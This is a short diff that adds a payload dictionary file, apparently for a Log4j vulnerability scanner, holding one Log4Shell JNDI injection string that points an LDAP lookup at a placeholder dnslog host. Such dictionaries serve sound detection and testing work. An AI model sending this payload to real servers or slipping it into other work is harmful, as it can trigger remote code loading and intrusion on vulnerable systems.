@@ -1,0 +1,3 @@
+# Log4j RCE dict
+
+${jndi:ldap://dnslog/test}
